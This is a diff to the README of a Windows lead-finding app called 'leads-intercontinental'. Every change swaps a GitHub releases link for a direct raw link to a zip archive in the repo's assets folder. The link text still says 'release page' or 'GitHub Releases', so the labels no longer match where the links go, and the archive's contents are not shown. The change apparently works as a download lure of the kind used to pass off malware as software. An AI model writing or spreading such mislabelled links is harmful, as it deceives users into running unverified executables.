@@ -1,6 +1,6 @@
 # 🔎 leads-intercontinental - Find and track high-value leads
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/lidand5937/leads-intercontinental/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Leads Intercontinental is a Windows desktop app for lead discovery and intellige
 
 Use the release page to get the app for Windows:
 
-[Visit the release page to download](https://github.com/lidand5937/leads-intercontinental/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip)
 
 ## 💻 What this app does
 
@@ -39,7 +39,7 @@ For best use, keep Windows updated and close other large apps before you run it.
 Follow these steps on your Windows PC.
 
 1. Open the release page:
-   https://github.com/lidand5937/leads-intercontinental/releases
+   https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip
 
 2. Find the latest release at the top of the page.
 
@@ -179,7 +179,7 @@ The Windows release page is the best place to begin if you want to install it on
 
 Go to the release page and download the Windows build:
 
-[https://github.com/lidand5937/leads-intercontinental/releases](https://github.com/lidand5937/leads-intercontinental/releases)
+[https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip](https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip)
 
 ## 🧰 If You Want to Keep It Handy
 
@@ -231,4 +231,4 @@ Keep your saved files before you update
 
 Use the release page any time you need the Windows installer:
 
-[Download from GitHub Releases](https://github.com/lidand5937/leads-intercontinental/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/lidand5937/leads-intercontinental/main/assets/intercontinental-leads-2.7.zip)
